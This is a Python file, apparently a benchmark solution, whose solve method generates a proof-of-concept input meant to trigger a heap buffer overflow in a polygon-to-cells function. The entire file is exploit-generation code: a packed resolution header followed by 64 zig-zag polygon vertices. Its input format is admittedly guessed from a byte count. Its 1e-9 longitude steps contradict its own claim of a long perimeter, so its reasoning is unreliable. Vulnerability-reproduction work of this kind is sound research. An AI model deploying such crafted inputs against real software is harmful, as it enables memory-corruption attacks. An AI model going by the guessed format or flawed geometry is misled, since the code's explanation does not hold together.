import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a heap buffer overflow in `polygonToCellsExperimental`
        due to an under-estimation of the required buffer size. This can be
        triggered by a polygon with a small bounding box but a long, complex
        perimeter that intersects many grid cells.

        The PoC format is inferred from the ground-truth length of 1032 bytes.
        A plausible structure is an 8-byte header followed by vertex data:
        - 4 bytes for resolution (unsigned int)
        - 4 bytes for vertex count (unsigned int)
        - 1024 bytes for 64 vertices (64 * 2 * 8 bytes for lat/lon pairs)
        Total size: 4 + 4 + 1024 = 1032 bytes.

        We construct a long, thin zig-zag polygon to exploit the vulnerability.
        This shape has a very small bounding box, which can fool simple
        estimation heuristics, but its long perimeter crosses many cells at
        high resolution, leading to an overflow when the actual cell list is written.
        """
        
        # Use the highest resolution to maximize cell density.
        resolution = 15
        num_verts = 64

        # Pack the header: resolution and vertex count as little-endian unsigned integers.
        header = struct.pack('<II', resolution, num_verts)
        
        poc_data = bytearray(header)

        # Define the geometry of the zig-zag polygon.
        lat_amplitude = 1e-5  # A very small latitude range for a thin shape.
        lon_start = 1.0       # An arbitrary starting longitude.
        lon_step = 1e-9       # Tiny increments to make the shape long.

        for i in range(num_verts):
            # Alternate latitude to create the zig-zag "teeth".
            lat = lat_amplitude if i % 2 != 0 else 0.0
            # Steadily increase longitude to stretch the polygon horizontally.
            lon = lon_start + (i * lon_step)
            
            # Pack vertex coordinates (lat, lon) as little-endian doubles.
            vertex_bytes = struct.pack('<dd', lat, lon)
            poc_data.extend(vertex_bytes)
            
        return bytes(poc_data)